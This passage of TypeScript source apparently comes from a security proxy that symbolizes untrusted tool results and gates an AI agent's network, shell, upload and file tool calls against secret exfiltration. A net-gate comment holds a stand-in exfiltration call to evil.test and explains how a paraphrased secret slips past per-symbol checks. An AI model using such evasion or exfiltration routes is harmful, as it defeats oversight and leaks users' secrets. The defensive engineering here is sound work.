        this.emitTllmCall(emit, seen, texts.join(""), { status: upstream.status });
        res.end();
        resolve();
      });
      src.on("end", finish);
      src.on("error", (err) => { this.log(`upstream stream error: ${err.message}`); finish(); });
    });
    await Promise.allSettled(recorded);
  }

  /**
   * Emit the ingress-side events for one exchange: a `symbolize` event per
   * minted symbol, a `tool_result` event per tool_result re-entering context,
   * each carrying BOTH representations (raw `original` + `symbolized`). All
   * best-effort. The §9 oracle predicate flags per-result whether any raw
   * untrusted byte survived in the forwarded prompt (it must not).
   */
  private emitIngressEvents(ctx: EventContext, rw: RewriteResult): void {
    this.emitPromptFilterEvents(ctx, rw.promptFilter);
    this.emitToolIngressEvents(ctx, rw);
  }

  /** Plan 15 §7: the blocked prompt spans this proxy refused once; a later
   *  request carrying them is forwarded with the arbiter's safe text. */
  private readonly promptBlocks = new PromptBlockLedger();

  /** The `prompt_filter` events of a request the prompt filter blocked
   *  (best-effort: the refusal never waits on them). */
  private emitBlockedPrompt(req: IncomingMessage, report: PromptFilterReport): void {
    try {
      const sessionId = this.sessionIdFor(req.headers);
      this.emitPromptFilterEvents({ sessionId, turn: this.nextTurn(sessionId), batchId: this.batchIdFor(req.headers), tenant: this.tenantFor(req.headers) }, report);
    } catch { /* events are off the security path */ }
  }

  /** What this proxy last recorded per segment (session × text hash): the
   *  agents resend every turn, so an event is recorded when a segment's
   *  outcome changes, its last finding gone included (PromptEventLedger). */
  private readonly promptEvents = new PromptEventLedger();

  /**
   * `prompt_filter` events (confidentiality-plan-15 §8, §13.7): one per
   * segment with a finding or a value the prompt floor let through, each
   * time its outcome differs from the one this proxy last recorded in the
   * session; and one with no findings when a segment recorded with one is
   * now answered with none (an exception, a kind set to pass), so the note
   * under the message clears. Best-effort; the detail carries offsets,
   * categories and symbols, never the value.
   */
  private emitPromptFilterEvents(ctx: EventContext, pf: PromptFilterReport | undefined): void {
    if (!pf) return;
    for (const s of pf.segments) {
      const rec = this.promptEvents.next(ctx.sessionId, s);
      if (rec === null) continue;
      this.safeEmit(makePromptFilter(ctx, {
        agent: pf.agent, segmentId: s.id, origin: s.origin,
        action: s.action === "rewrite" || s.action === "block" ? s.action : "pass",
        findings: s.findings.map((f) => ({
          filterId: f.filterId, category: f.category, action: f.action, start: f.start, end: f.end,
          ...(f.symbol ? { symbol: f.symbol } : {}), ...(f.how ? { how: f.how } : {}),
          // Plan 15 §7 (phase 3): the span's reference, a verdict that let
          // it through, an ask's hold. Never the span.
          ...(f.ref ? { ref: f.ref } : {}), ...(f.let ? { let: f.let } : {}),
          ...(f.hold ? { hold: { state: f.hold.state, ...(f.hold.approvalId ? { approvalId: f.hold.approvalId } : {}) } } : {}),
          // The arbiter's lock (a locked administrator's ask row): this message only.
          ...(f.onceOnly === true ? { onceOnly: true as const } : {}),
        })),
        ...(rec.turn ? { turn: rec.turn } : {}),
        skipped: s.skipped, enforcing: pf.enforcing, digest: pf.digest,
      }));
    }
  }

  private emitToolIngressEvents(ctx: EventContext, rw: RewriteResult): void {
    // §9 oracle scoped to the UNTRUSTED spans (the forwarded tool_result blocks,
    // post-symbolization → symbol tokens), NOT the whole prompt — a raw value that
    // ALSO appears in TRUSTED content (the user prompt / the agent's own command) is
    // not a leak. Same fix as emitTllmCall; this per-result flag had the bug too.
    const forwardedUntrusted = oracleHaystack(rw.request, rw.rewrites);
    for (const r of rw.rewrites) {
      // The bytes the symbol replaced: the whole value, or — for a split result
      // (a trailing <system-reminder> tail symbolized off a TRUSTED body) — the
      // tail only. The body survives BY DESIGN, so it must not feed the oracle.
      const span = r.symbolizedSpan ?? r.value;
      // What the symbol RESOLVES to: the wire span, except a Read, whose value
      // is the un-rendered file bytes (rewrite-request.ts unrenderReadResult).
      const resolved = r.symbolValue ?? span;
      // A value-only release (backstop-value-only.md): one symbol per
      // replaced registered value, each resolving to that value.
      const symbols: SymbolRef[] = r.valueOnly
        ? r.valueOnly.map((v) => symbolRef(v.symbol, r.tool, v.value, r.origin ?? null, null, r.confidentiality))
        : r.symbolized && r.symbol
          ? [symbolRef(r.symbol, r.tool, resolved, r.origin ?? null)]
          : [];
      // Per-result invariant: did THIS result's raw bytes survive un-symbolized in the
      // forwarded tool_result spans? For a symbolized result the original must be gone
      // — the wire span and a dropped reminder tail (rewrite-request.ts mustNotSurvive);
      // elsewhere in the request, all but a dropped token-budget reminder (crossResultSpans).
      const survivor = r.symbolized
        ? survivingResult(ownForwardedText(r), forwardedUntrusted, mustNotSurvive(r), crossResultSpans(r))
        : null;

      if (r.valueOnly) {
        for (const v of r.valueOnly) {
          this.safeEmit(makeSymbolize({
            ctx, callId: r.toolUseId, tool: r.tool, symbol: v.symbol, original: v.value, origin: r.origin ?? null,
            ...(r.confidentiality ? { confidentiality: r.confidentiality } : {}),
          }));
        }
      } else if (r.symbolized && r.symbol) {
        this.safeEmit(
          makeSymbolize({
            ctx,
            callId: r.toolUseId,
            tool: r.tool,
            symbol: r.symbol,
            original: resolved,
            origin: r.origin ?? null,
            // Confidentiality level (plan 5): rides onto the SymbolRef so the
            // dashboard badges it and the §12 oracle can assert on it.
            ...(r.confidentiality ? { confidentiality: r.confidentiality } : {}),
          }),
        );
      }

      this.safeEmit(
        makeToolResult({
          ctx,
          callId: r.toolUseId,
          tool: r.tool,
          original: r.value,
          // What T-LLM saw: the forwarded text (split case: body + symbol), the
          // symbol when whole-result symbolized, else the raw value (TRUSTED
          // passthrough — original === symbolized, differs=false).
          symbolized: r.forwardedText ?? (r.symbolized && r.symbol ? r.symbol : r.value),
          symbols,
          trust: r.trust,
          reason: r.reason,
          ...(r.confidentiality ? { confidentiality: r.confidentiality } : {}),
          ...(r.twinNoteInfo ? { twinNote: r.twinNoteInfo } : {}),
          ...(r.secretTaint ? { secretTaint: { level: r.secretTaint.level, files: r.secretTaint.files, apps: r.secretTaint.apps, rule: r.secretTaint.rule, maskWhole: r.secretTaint.maskWhole, denied: r.secretTaint.denied } } : {}),
          ...(r.secretNote ? { secretNote: r.secretNote } : {}),
          violatedInvariant: survivor !== null,
        }),
      );
    }
  }

  /** Read the full request body, enforcing the max-size cap. */
  private readBody(req: IncomingMessage, res: ServerResponse): Promise<Buffer | null> {
    return new Promise((resolve) => {
      const chunks: Buffer[] = [];
      let size = 0;
      let aborted = false;
      req.on("data", (c: Buffer) => {
        if (aborted) return;
        size += c.length;
        if (size > this.maxBodyBytes) {
          aborted = true;
          this.refuse(res, 413, `request body exceeds ${this.maxBodyBytes} bytes`);
          resolve(null);
          req.destroy();
          return;
        }
        chunks.push(c);
      });
      req.on("end", () => {
        if (!aborted) resolve(Buffer.concat(chunks));
      });
      req.on("error", () => {
        if (!aborted) {
          aborted = true;
          this.refuse(res, 400, "error reading request body");
          resolve(null);
        }
      });
    });
  }

  /**
   * Forward `body` upstream and stream the response back to `res`, byte-for-byte.
   * When `sniff` is set, tap the response (without altering it) to reconstruct
   * tool_use blocks and record them via the arbiter. When an `emit` context is
   * provided, also emit `tool_use` events and a final `tllm_call` event
   * (best-effort, off the security path).
   */
  private async forwardAndStream(
    method: string,
    path: string,
    headers: IncomingMessage["headers"],
    body: Buffer,
    res: ServerResponse,
    sniff: boolean,
    declaredStream?: boolean,
    emit?: EmitState,
  ): Promise<void> {
    // The session this exchange belongs to, derived on the SECURITY path from
    // the request headers — deliberately NOT read off `emit`, which is optional
    // observability state. The tool_use gates (exec, net) consult the session's
    // confidentiality watermark, and a security decision must never depend on
    // whether event emission happens to be configured.
    const sessionId = this.sessionIdFor(headers);
    // Recompute content-length for the (possibly rewritten) body; strip hop-by-
    // hop / encoding headers we don't reproduce.
    const fwdHeaders = this.sanitizeHeaders(headers, body.length);
    // The agent's own key, put back in the auth header for the upstream's
    // host only (agent-sign-in.md §3).
    await this.restoreAgentKey(fwdHeaders, this.upstreamOrigin);

    let upstream: UpstreamResponse;
    try {
      upstream = await this.upstreamWithRetry({ method, path, headers: fwdHeaders, body });
    } catch (err) {
      this.log(`upstream error: ${(err as Error).message}`);
      this.refuse(res, 502, `upstream request failed: ${(err as Error).message}`);
      return;
    }

    // Mirror upstream status + headers. With no rewriter active the response
    // body is passed through unchanged; with a view map (P2 tool_use path args)
    // or the exec gate (a blocked command → `exit 77` sentinel) active, the byte
    // length can change — drop content-length and let Node chunk the relay.
    // The NET gate can rewrite a tool_use too (a blocked destination becomes a
    // sentinel URL), and it is always active — so the body length can always
    // change. Drop content-length and let Node chunk the relay.
    const mayRewriteResponse = sniff;
    res.writeHead(
      upstream.status,
      this.responseHeaders(upstream.headers, { dropContentLength: mayRewriteResponse }),
    );

    if (!sniff) {
      upstream.body.pipe(res);
      await this.finished(res);
      return;
    }

    // Decide streaming vs buffered by the upstream content-type. A non-2xx (e.g.
    // a 429 rate-limit / 529 overloaded relayed after the retry cap) comes back
    // as a JSON ERROR body even when the client asked to stream — route it to the
    // buffered path so we can extract the error and surface it on the tllm_call.
    const ctype = headerValue(upstream.headers, "content-type") ?? "";
    const isSse = upstream.status < 400 && (ctype.includes("text/event-stream") || declaredStream === true);

    if (isSse) {
      await this.streamAndSniffSse(upstream.body, res, sessionId, emit, upstream.status);
    } else {
      await this.bufferAndSniffJson(upstream.body, res, sessionId, emit, upstream.status);
    }
  }

  /**
   * The per-exchange tool_use input transform: the P3 sensitive-path gate
   * composed with the P2 forward map, IN THAT ORDER. The gate runs on the path
   * the model REQUESTED (HumanView spelling), because the arbiter's sensitive
   * list is HumanView (`~/.ssh` etc.): if the forward map rewrote `~/.ssh` into
   * its AgentView spelling FIRST, the arbiter could never recognize it as
   * sensitive and rule-1 deny-precedence ("a workspace rooted at ~ must still
   * gate ~/.ssh") would be unreachable. So: gate first; a denied field becomes
   * a `/mandu/denied/…` sentinel (which the map then leaves untouched — it is
   * under no root); an allowed field is forward-mapped to its AgentView
   * spelling for execution. NEVER throws — a gate/arbiter error is enforced
   * INSIDE gateToolUseInput as a denied-sentinel (fail-closed). Each denied
   * field emits an `fs_action` event (best-effort). Null when no view map.
   */
  /**
   * The patch leg of one tool_use (gate-surface.ts PatchToolFields): null when
   * `name` is no patch tool, or every path its patch names passed both legs
   * (the call then continues through the other steps, and step 2 maps the
   * header paths). Otherwise the refusal input and why. The header paths
   * reach the SAME fs gate and derived-label code a typed path field does, as
   * synthetic fields (`input#<n>:<kind>`), so the sensitive-path policy, the
   * approval queue, the timeouts and the fail-closed arbiter handling are
   * those gates' own. NEVER throws.
   */
  private async gatePatchToolUse(
    name: string,
    input: unknown,
    toolUseId: string,
    surface: GateSurface,
    gateSession: string,
    viewMap: ViewMap | null | undefined,
    emit: EmitState | undefined,
  ): Promise<{ input: Record<string, unknown>; refused: string } | null> {
    const spec = surface.patch && Object.prototype.hasOwnProperty.call(surface.patch, name) ? surface.patch[name]! : undefined;
    if (!spec) return null;
    const refuse = (why: string, path: string, ruleRef: RuleRef, requiresApproval: boolean, approvalId?: string): { input: Record<string, unknown>; refused: string } => {
      const out = refusedToolInput(why);
      this.log(`patch-gate: REFUSED ${name} (${toolUseId || "no id"}): ${why}`);
      if (emit) {
        this.safeEmit(makeFsGate({
          ctx: emit.ctx, callId: toolUseId, tool: name, field: spec.field, path,
          sentinel: JSON.stringify(out), reason: why, requiresApproval, ruleRef,
          ...(approvalId ? { approvalId } : {}),
        }));
      }
      return { input: out, refused: why };
    };
    const obj = input && typeof input === "object" && !Array.isArray(input) ? input as Record<string, unknown> : null;
    const parsed = parseApplyPatch(obj?.[spec.field]);
    if (!parsed.ok) {
      return refuse(
        `the patch could not be read, so the files it touches could not be checked; nothing was applied: ${parsed.error}`,
        "(unreadable patch)", { source: "fail-closed", id: "patch:unreadable" }, true,
      );
    }
    if (parsed.paths.length === 0) return null; // OpenClaw rejects it: "No files were modified."
    const keyOf = (i: number): string => `${spec.field}#${i + 1}:${parsed.paths[i]!.kind}`;
    const every = Object.fromEntries(parsed.paths.map((p, i) => [keyOf(i), p.path]));
    // 1. the sensitive-path gate, every header path as a write (view-map-gated, as for a typed field)
    if (viewMap) {
      const gate = await gateToolUseInput(name, every, {
        arbiter: this.arbiter, viewMap, sessionKey: gateSession, log: this.log,
        pathTools: { [name]: { fields: Object.keys(every), mode: "write" } },
        ...this.relativeBaseFor(surface),
      });
      if (gate && gate.gated.length > 0) {
        const g = gate.gated[0]!;
        const requiresApproval = g.decision ? g.decision.allow === false && g.decision.requiresApproval : true;
        return refuse(
          `the patch touches ${g.path}, which was denied (${g.reason}); nothing was applied`,
          g.path, g.ruleRef, requiresApproval, g.approvalId,
        );
      }
    }
    // 2. the derived label on every path the patch WRITES (not a delete)
    const writes = Object.fromEntries(parsed.paths.flatMap((p, i) => (patchWrites(p.kind) ? [[keyOf(i), p.path]] : [])));
    if (Object.keys(writes).length > 0) {
      const lbl = await labelWrittenPaths(name, writes, {
        arbiter: this.arbiter, sessionKey: gateSession, ...(viewMap ? { viewMap } : {}), log: this.log,
        pathTools: { [name]: { fields: Object.keys(writes), mode: "write" } },
        ...this.relativeBaseFor(surface),
      });
      for (const w of lbl?.writes ?? []) {
        if (emit) {
          this.safeEmit(makeFsLabel({
            ctx: emit.ctx, callId: toolUseId, tool: w.tool, field: w.field, path: w.path, level: w.level,
            reason: w.reason, ...(w.sentinel ? { sentinel: w.sentinel } : {}),
          }));
        }
      }
      const denied = lbl?.writes.find((w) => w.sentinel);
      if (denied) {
        return refuse(
          `the patch writes ${denied.path}, which cannot be written unlabeled (${denied.reason}); nothing was applied`,
          denied.path, { source: "fail-closed", id: "patch:unlabelable-write" }, false,
        );
      }
    }
    return null;
  }

  /** The relative-path base the gates may use for this surface: the agent's
   *  start directory, only when the agent resolves against it and the
   *  launcher named it (fs-gate.ts resolveRelative). */
  private relativeBaseFor(surface: GateSurface): { relativeBase?: string } {
    return surface.relativeBase === "launch" && this.agentCwd !== undefined ? { relativeBase: this.agentCwd } : {};
  }

  /**
   * The reply-media gate's options for one response (reply-media.ts;
   * supported-agents.md §2.1, "Files named in the reply"), or null when the
   * session's agent attaches no file its reply names. The surface is the
   * session's (the union when the arbiter cannot say: the gate then reads
   * every reply). Each held reference is an `fs_action` deny event.
   */
  private async replyMediaFor(sessionKey: string, emit?: EmitState): Promise<ReplyMediaStreamOptions | null> {
    const surface = await this.gateSurfaces.get(this.sessionKey);
    if (!surface.replyMedia) return null;
    const base = this.relativeBaseFor(surface).relativeBase;
    return {
      arbiter: this.arbiter,
      sessionKey: this.sessionKey ?? sessionKey,
      ...(base !== undefined ? { launchDir: base } : {}),
      tlsInspected: this.netTlsInspected,
      log: this.log,
      onResult: (r: ReplyMediaResult) => {
        this.log(`reply-media: ${r.withheld.length} reference(s) held, ${r.neutralized} possible directive(s) neutralized`);
        if (!emit) return;
        for (const w of r.withheld) {
          this.safeEmit(makeFsGate({
            ctx: emit.ctx, callId: "", tool: REPLY_MEDIA_TOOL, field: "reply",
            path: w.path ?? w.ref, sentinel: "(the MEDIA: line, replaced by a notice)", reason: w.reason,
            requiresApproval: w.requiresApproval, ruleRef: w.ruleRef,
            ...(w.approvalId ? { approvalId: w.approvalId } : {}),
          }));
        }
      },
    };
  }

  private toolInputTransform(sessionKey: string, emit?: EmitState): ToolInputTransform | null {
    const viewMap = this.viewMap;
    // THE SESSION THE WATERMARK LIVES ON — not the one the events are filed under.
    //
    // `sessionKey` here is the per-request EVENT id, derived from the
    // `x-mandu-session-id` header and SANITIZED (`/` → `_`). The watermark is
    // raised under `MANDU_SESSION_KEY` (`this.sessionKey`) — that is what the
    // MCP `declassify_symbol` call carries, and what `symbolize` taints. The two
    // are the same string only because the launcher sets both from `plan.scopeId`
    // AND the sanitizer happens to be a no-op on the default `${epoch}-${pid}`.
    // Give the launcher an `--id a/b` and they diverge: the gates below would then
    // ask about a session that is permanently `public`, and the watermark would go
    // INERT — a silent fail-open in all three (net, exec, and the fs label).
    // Ask about the session the watermark is actually on.
    const gateSession = this.sessionKey ?? sessionKey;
    // The transform is present when EITHER the exec gate (Phase 0, no view map
    // needed), the P2/P3 fs path machinery (view map), or the NET gate (Plan 8 —
    // always eligible: it is the session watermark's chokepoint and needs no
    // view map, and the arbiter no-ops it when there is no watermark to enforce).
    // The NET gate has no prerequisite — it needs no view map and no exec gate,
    // and it is the session watermark's ONLY live chokepoint (net-proxy and
    // net-supervisor are both off at the default posture). So the transform is
    // ALWAYS present. It is free for non-network tools: gateNetToolUse returns
    // before any arbiter round-trip unless the tool actually reaches the network.
    void viewMap;
    // This transform serves ONE response (one model turn): the calls gated
    // so far, in order, and the first of them that may write files (set per
    // call by the wrapper at the end; the window rule of the upload legs).
    const turn: { calls: string[]; priorWriter: string | undefined } = { calls: [], priorWriter: undefined };
    // One tool's gates, in order. `wrap` puts a (gated) input back into the
    // envelope the agent actually receives: identity for a direct call, the
    // dispatcher's envelope for a call routed through one (dispatch.ts). Only
    // the net gate's history needs it (it restores the block as it went out).
    const gateOne = async (
      name: string,
      input: unknown,
      toolUseId: string,
      surface: GateSurface,
      wrap: (inner: unknown) => unknown,
    ): Promise<{ input: unknown; changed: boolean; refused?: string } | null> => {
      let cur = input;
      let changed = false;
      // -2. A REFUSED FORM (gate-surface refuseArgs; supported-agents.md
      //     §2.1): `exec{host: "node"}` runs on a paired device,
      //     `browser{target: "node}` drives a paired device's browser, both
      //     outside Mandu's box. The field becomes a value the tool rejects
      //     (and a shell's command the block sentinel); nothing else gates a
      //     call that will not run. `refused` lets a dispatcher refuse its
      //     envelope instead.
      const ra = refusedArg(name, cur, surface);
      if (ra) {
        const cmdField = Object.prototype.hasOwnProperty.call(surface.exec, name) ? surface.exec[name]! : undefined;
        const out = refusedArgInput(cur as Record<string, unknown>, ra.field, ra.reason,
          cmdField ? { field: cmdField, sentinel: blockSentinelCommand(`tool form refused: ${ra.reason}`) } : undefined);
        this.log(`refuse: ${name}.${ra.field} (${toolUseId || "no id"}): ${ra.reason}`);
        if (emit) {
          this.safeEmit(
            makeExecGate({
              ctx: emit.ctx,
              callId: toolUseId,
              tool: name,
              field: ra.field,
              decision: "block",
              reason: `tool form refused: ${ra.reason}`,
              symbols: [],
              evasion: [],
              shell: "AgentShell",
              sentinel: JSON.stringify(out[ra.field]),
              ruleRef: { source: "fail-closed", id: "tool:refused-form" },
            }),
          );
        }
        return { input: out, changed: true, refused: ra.reason };
      }
      // -1.5 THE UPLOAD LEG (upload-gate.ts; supported-agents.md §2): a tool
      //      that uploads LOCAL FILES by path, their bytes never entering the
      //      model context (Claude Code's DesignSync `write_files{localPath}`,
      //      Artifact `publish{file_path, files}`, ArtifactData `file_path`).
      //      Every file is put to the arbiter's upload gate (its label, its
      //      registration, the secret values in its bytes) and every string
      //      the call sends to the net legs; any block refuses the whole call.
      //      A hand-built surface without the table gets the union's.
      {
        const ug = await gateUploadToolUse(name, cur, {
          uploadTools: surface.upload ?? UNION_GATE_SURFACE.upload ?? {},
          arbiter: this.arbiter,
          sessionKey: gateSession,
          plans: this.uploadPlans,
          log: this.log,
          tlsInspected: this.netTlsInspected,
          // OpenClaw's kinds: a media tool's reference fields, and the
          // directory a relative reference is read in (when known)
          pathTools: surface.paths,
          ...(this.relativeBaseFor(surface).relativeBase !== undefined ? { launchDir: this.relativeBaseFor(surface).relativeBase } : {}),
          ...(turn.priorWriter !== undefined ? { priorWriter: turn.priorWriter } : {}),
        });
        if (ug.outcome?.decision === "block") {
          const o = ug.outcome;
          // the model's own call goes back into its history (net-gate.ts
          // NetGateHistory): it reads the notice, not a refusal it wrote
          this.netGateHistory.remember(toolUseId, wrap(cur), wrap(ug.input));
          if (emit) {
            this.safeEmit(o.net
              ? makeNetGate({
                  ctx: emit.ctx, callId: toolUseId, tool: name,
                  // Claude Code's kinds present as claude.ai; an OpenClaw
                  // message's fetched URL names its own host
                  destination: o.net.destination !== null && !UPLOAD_HOSTS.includes(o.net.destination) ? o.net.destination : UPLOAD_HOST,
                  decision: "block", reason: o.net.reason, sentinel: o.net.sentinel,
                  ...(o.net.ruleRef ? { ruleRef: o.net.ruleRef } : {}),
                  ...(o.net.approvalId ? { approvalId: o.net.approvalId } : {}),
                })
              : makeFsGate({
                  ctx: emit.ctx, callId: toolUseId, tool: name, field: o.field ?? "method",
                  path: o.path ?? "(the call)", sentinel: JSON.stringify(ug.input), reason: o.reason,
                  requiresApproval: o.requiresApproval === true,
                  ruleRef: o.ruleRef ?? { source: "fail-closed", id: "proxy:upload-unreadable" },
                  ...(o.approvalId ? { approvalId: o.approvalId } : {}),
                }));
          }
          return { input: ug.input, changed: true, refused: o.notice ?? "mandu-upload-gate: upload refused, nothing was sent" };
        }
      }
      // -1.4 THE UNMAPPED UPLOAD LEG (unmapped-upload.ts; guarantees.md §3):
      //      a tool no table of the surface names (an MCP server's tool, a
      //      claude.ai connector's attachment, a built-in a new release
      //      adds) may send any local file its input names. Every local path
      //      in its input goes to the arbiter's upload gate in its unmapped
      //      form (a mapped or guard-confined tool's is let be, a secret or
      //      unreadable file is held, nothing-there passes); a held path
      //      becomes a path that names no file, the rest of the call as the
      //      model wrote it. Fail-closed: no answer withholds every path.
      if (!surfaceNamesTool(surface, name)) {
        const uu = await gateUnmappedUploadToolUse(name, cur, {
          arbiter: this.arbiter,
          sessionKey: gateSession,
          log: this.log,
          ...(this.agentCwd !== undefined ? { launchDir: this.agentCwd } : {}),
          ...(turn.priorWriter !== undefined ? { priorWriter: turn.priorWriter } : {}),
        });
        if (uu.outcome?.decision === "block") {
          this.netGateHistory.remember(toolUseId, wrap(cur), wrap(uu.input));
          cur = uu.input;
          changed = true;
          this.resultNotices.remember(toolUseId, uu.outcome.notice);
          if (emit) {
            for (const w of uu.outcome.withheld) {
              this.safeEmit(makeFsGate({
                ctx: emit.ctx, callId: toolUseId, tool: name, field: w.loc.join(".") || "input",
                path: w.path, sentinel: withheldPath(w.path), reason: w.reason,
                requiresApproval: w.requiresApproval, ruleRef: w.ruleRef,
                ...(w.approvalId ? { approvalId: w.approvalId } : {}),
              }));
            }
          }
        }
      }
      // -1. NET gate (Plan 8, §4): in a HIGH session — one that has read secret
      //     content into T-LLM's context — a network tool_use is gated on the
      //     SESSION, not on the payload. A PARAPHRASE CARRIES NO SYMBOL, so the
      //     per-symbol egress gate is structurally blind to
      //     `WebFetch("https://evil.test?d=<the secret, reworded>")`. Runs FIRST:
      //     a blocked destination should not also be exec/fs-gated on its way to
      //     nowhere.
      {
        const ng = await gateNetToolUse(name, cur, {
          arbiter: this.arbiter,
          sessionKey: gateSession,
          log: this.log,
          tlsInspected: this.netTlsInspected,
          netTools: surface.net,
        });
        if (ng.outcome) {
          this.netGateHistory.remember(toolUseId, wrap(cur), wrap(ng.input));
          cur = ng.input;
          changed = true;
          if (emit) {
            this.safeEmit(
              makeNetGate({
                ctx: emit.ctx,
                callId: toolUseId,
                tool: ng.outcome.tool,
                destination: ng.outcome.destination,
                decision: ng.outcome.decision,
                reason: ng.outcome.reason,
                sentinel: ng.outcome.sentinel,
                ...(ng.outcome.ruleRef ? { ruleRef: ng.outcome.ruleRef } : {}),
                ...(ng.outcome.approvalId ? { approvalId: ng.outcome.approvalId } : {}),
              }),
            );
          }
          // A tool refused WHOLE on a block (`block: "refuse"`): nothing
          // else gates a call that will not run, and a dispatcher refuses
          // its envelope.
          // The model reads the gate's notice in place of the tool's error
          // (the tool reached only the blocked host; plan 10 §11.8).
          if (ng.outcome.decision === "block") this.resultNotices.remember(toolUseId, ng.outcome.notice);
          if (ng.outcome.decision === "block" && surface.net[name]?.block === "refuse") {
            return { input: cur, changed: true, refused: ng.outcome.notice ?? "network use blocked, nothing was sent" };
          }
        }
      }
      // 0. Exec gate (exec-routing.md §3): a Bash/shell command carrying an
      //    untrusted symbol in command position is rewritten to a benign
      //    `exit 77` sentinel on the wire (fail-closed). Independent of the view
      //    map. Data-position symbols pass through opaque (not over-blocked).
      if (this.execGateEnabled) {
        const eg = await gateExecToolUse(name, cur, {
          arbiter: this.arbiter, sessionKey: gateSession, log: this.log,
          // The clean-verdict correlation leg (exec-routing.md §8.5): the
          // recorded decision carries the tool_use id so the exec supervisor's
          // signature lookup learns which callId to report its verdict on.
          callId: toolUseId,
          commandFields: surface.exec,
          // A secret placeholder the agent's shell would expand to nothing
          // is delivered requoted (confidentiality.md §7).
          requote: true,
        });
        if (eg.outcome) {
          if (eg.outcome.decision === "allow" && eg.outcome.requoted !== undefined) {
            // The model reads back the command it wrote (net-gate.ts
            // NetGateHistory); the agent runs the requoted one.
            this.netGateHistory.remember(toolUseId, wrap(cur), wrap(eg.input));
            cur = eg.input;
            changed = true;
          }
          if (eg.outcome.decision === "block") {
            // The model's own command goes back into its history (net-gate.ts
            // NetGateHistory, confidentiality.md §4 "What the model reads
            // back"): echoed as the sentinel, the model read a past in which
            // it had itself written `echo 'mandu-exec-gate: blocked …'; exit
            // 77` and apologized for a fake block (live 2026-10-11,
            // watch-20261010T203050). It reads its command and the notice.
            this.netGateHistory.remember(toolUseId, wrap(cur), wrap(eg.input));
            cur = eg.input;
            changed = true;
            this.execGateNotices.remember(toolUseId, eg.outcome.notice);
          }
          if (emit) {
            this.safeEmit(
              makeExecGate({
                ctx: emit.ctx,
                callId: toolUseId,
                tool: eg.outcome.tool,
                field: eg.outcome.field,
                decision: eg.outcome.decision,
                reason: eg.outcome.reason,
                symbols: eg.outcome.symbols,
                evasion: eg.outcome.evasion,
                shell: eg.outcome.shell,
                sentinel: eg.outcome.sentinel,
                ...(eg.outcome.ruleRef ? { ruleRef: eg.outcome.ruleRef } : {}),
                ...(eg.outcome.approvalId ? { approvalId: eg.outcome.approvalId } : {}),
                ...(eg.outcome.programText ? { programText: eg.outcome.programText } : {}),
              }),
            );
          }
        }
      }
      // 0.25 MCP command tools (plan 10 §11.13): an MCP tool whose input
      //      carries a command-like field (`command`, `cmd`, `script`, `code`,
      //      …) goes through the same exec gate, so a HIGH session blocks an
      //      MCP `run_command` as it blocks Bash. Fail-closed like the gate.
      if (this.execGateEnabled && isMcpCommandCandidate(name, surface.exec)) {
        const mg = await gateCommandLikeToolUse(name, cur, { arbiter: this.arbiter, sessionKey: gateSession, log: this.log, callId: toolUseId });
        if (mg.outcome) {
          if (mg.outcome.decision === "block") {
            this.netGateHistory.remember(toolUseId, wrap(cur), wrap(mg.input));
            cur = mg.input;
            changed = true;
            this.execGateNotices.remember(toolUseId, mg.outcome.notice);
          }
          if (emit) {
            this.safeEmit(
              makeExecGate({
                ctx: emit.ctx,
                callId: toolUseId,
                tool: mg.outcome.tool,
                field: mg.outcome.field,
                decision: mg.outcome.decision,
                reason: mg.outcome.reason,
                symbols: mg.outcome.symbols,
                evasion: mg.outcome.evasion,
                shell: mg.outcome.shell,
                sentinel: mg.outcome.sentinel,
                ...(mg.outcome.ruleRef ? { ruleRef: mg.outcome.ruleRef } : {}),
                ...(mg.outcome.approvalId ? { approvalId: mg.outcome.approvalId } : {}),
              }),
            );
          }
        }
      }
      // 0.5 The STDIN gate (supported-agents.md §2.1): text a tool types into
      //     a running process (OpenClaw `process{write|paste|send-keys}`,
      //     often into a shell) is exec-gated like a command. A block refuses
      //     the whole call; nothing is typed.
      if (this.execGateEnabled) {
        const sg = await gateStdinToolUse(name, cur, {
          stdinTools: surface.stdin, arbiter: this.arbiter, sessionKey: gateSession, log: this.log,
        });
        if (sg.outcome?.decision === "block") {
          const why = `typing into the process was blocked, nothing was typed: ${plainBlockWords(sg.outcome.reason)}. detail: ${sg.outcome.reason}`;
          const out = refusedToolInput(why);
          this.log(`stdin-gate: BLOCKED ${name}.${sg.outcome.field} (${sg.outcome.reason})`);
          if (emit) {
            const g = sg.outcome.gate;
            this.safeEmit(
              makeExecGate({
                ctx: emit.ctx,
                callId: toolUseId,
                tool: name,
                field: sg.outcome.field,
                decision: "block",
                reason: sg.outcome.reason,
                symbols: g?.symbols ?? [],
                evasion: g?.evasion ?? [],
                shell: g?.shell ?? "AgentShell",
                sentinel: JSON.stringify(out),
                ruleRef: g?.ruleRef ?? { source: "fail-closed", id: "stdin:unreadable" },
                ...(g?.approvalId ? { approvalId: g.approvalId } : {}),
              }),
            );
          }
          return { input: out, changed: true, refused: why };
        }
        if (sg.outcome?.decision === "allow" && emit) {
          for (const g of sg.outcome.checked) {
            this.safeEmit(
              makeExecGate({
                ctx: emit.ctx,
                callId: toolUseId,
                tool: g.tool,
                field: g.field,
                decision: "allow",
                reason: g.reason,
                symbols: g.symbols,
                evasion: g.evasion,
                shell: g.shell,
                ...(g.ruleRef ? { ruleRef: g.ruleRef } : {}),
              }),
            );
          }
        }
      }
      // 0.9 THE PATCH LEG (gate-surface.ts PatchToolFields; supported-agents.md
      //     §2.1): OpenClaw's apply_patch names its target paths in the file
      //     headers of one text field. Each header path goes to the
      //     sensitive-path gate as a write and, when the patch writes it, to
      //     the derived label, exactly as a typed path field would; a patch
      //     that does not parse, or touches a path either leg denies, is
      //     refused whole (nothing is applied). The header paths are mapped
      //     to the AgentView in step 2 (view-map.ts).
      {
        const pr = await this.gatePatchToolUse(name, cur, toolUseId, surface, gateSession, viewMap, emit);
        if (pr) return { input: pr.input, changed: true, refused: pr.refused };
      }
      // A blocked command is now a benign sentinel with no path fields, so the
      // fs gate / view map below simply no-op on it.
      // The paths steps 1 and 1.5 deny, for the notice the model reads in
      // place of the tool's error (path-denial-notice.ts).
      const denials: PathDenial[] = [];
      let shellBlocked = false;
      // 1. Gate on the requested (HumanView) path so sensitivity is judged
      //    against the arbiter's HumanView sensitive list. VIEW-MAP-GATED: the
      //    gate needs the workspace roots to judge in-workspace paths.
      if (viewMap) {
        const gate = await gateToolUseInput(name, cur, {
          arbiter: this.arbiter,
          viewMap,
          // Attribution-only, same source as the exec/net gates (gateSession =
          // the watermark session) so fs approval rows attribute identically.
          sessionKey: gateSession,
          log: this.log,
          pathTools: surface.paths,
